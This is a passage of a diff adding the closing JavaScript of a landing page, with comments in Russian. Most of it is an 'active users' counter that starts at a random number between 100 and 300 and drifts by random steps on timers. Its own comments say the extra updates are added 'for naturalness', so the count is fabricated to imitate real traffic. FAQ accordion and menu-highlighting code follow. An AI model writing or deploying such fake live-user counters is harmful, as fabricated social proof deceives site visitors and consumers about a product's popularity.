+        let activeUsers = Math.floor(Math.random() * (300 - 100 + 1)) + 100;
+        const minUsers = 100;
+        const maxUsers = 300;
+        
+        const smallCounter = document.getElementById('activeUsers');
+        const largeCounter = document.getElementById('activeUsersLarge');
+        
+        // Обновляем начальное значение
+        smallCounter.textContent = activeUsers;
+        largeCounter.textContent = activeUsers;
+        
+        function updateActiveUsers() {
+            // Случайное изменение от -5 до +5
+            const change = Math.floor(Math.random() * 11) - 5;
+            activeUsers += change;
+            
+            // Ограничение в пределах min-max
+            if (activeUsers < minUsers) activeUsers = minUsers + Math.floor(Math.random() * 15);
+            if (activeUsers > maxUsers) activeUsers = maxUsers - Math.floor(Math.random() * 15);
+            
+            // Добавляем класс анимации
+            smallCounter.classList.add('updating');
+            largeCounter.classList.add('updating');
+            
+            // Обновление всех элементов
+            smallCounter.textContent = activeUsers;
+            largeCounter.textContent = activeUsers;
+            
+            // Убираем класс анимации
+            setTimeout(() => {
+                smallCounter.classList.remove('updating');
+                largeCounter.classList.remove('updating');
+            }, 300);
+        }
+        
+        // Главный интервал - обновление каждые 1.5-3 секунды
+        setInterval(() => {
+            updateActiveUsers();
+        }, 1500);
+        
+        // Дополнительные случайные обновления для естественности
+        setInterval(() => {
+            if (Math.random() > 0.5) {
+                updateActiveUsers();
+            }
+        }, 800);
+        
+        // FAQ аккордеон
+        function toggleFaq(button) {
+            const content = button.nextElementSibling;
+            const icon = button.querySelector('.faq-icon');
+            const isOpen = content.classList.contains('open');
+            
+            // Закрываем все
+            document.querySelectorAll('.faq-content').forEach(item => {
+                item.classList.remove('open');
+            });
+            document.querySelectorAll('.faq-icon').forEach(item => {
+                item.classList.remove('rotated');
+            });
+            
+            // Открываем текущий, если был закрыт
+            if (!isOpen) {
+                content.classList.add('open');
+                icon.classList.add('rotated');
+            }
+        }
+        
+        // Подсветка активного пункта мобильного меню
+        const sections = document.querySelectorAll('section[id]');
+        const navItems = document.querySelectorAll('.mobile-nav-item');
+        
+        function updateActiveNav() {
+            const scrollPos = window.scrollY + 150;
+            
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.offsetHeight;
+                const sectionId = section.getAttribute('id');
+                
+                if (scrollPos >= sectionTop && scrollPos < sectionTop + sectionHeight) {
+                    navItems.forEach(item => {
+                        item.classList.remove('active');
+                        if (item.getAttribute('href') === '#' + sectionId) {
+                            item.classList.add('active');
+                        }
+                    });
+                }
+            });
+        }
+        
+        window.addEventListener('scroll', updateActiveNav);
+        updateActiveNav();
+    </script>
+</body>
+</html>
